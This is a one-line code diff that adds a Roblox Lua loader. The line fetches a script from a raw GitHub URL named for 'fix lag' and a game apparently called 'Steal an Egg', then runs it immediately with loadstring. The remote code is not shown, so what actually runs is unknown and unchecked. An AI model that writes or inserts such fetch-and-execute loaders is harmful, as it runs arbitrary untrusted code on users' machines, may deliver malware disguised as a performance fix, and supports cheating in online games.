@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TND-Hub/TND-Hub/refs/heads/main/fixlag%2Brunscript%20stealanegg%20v2"))()
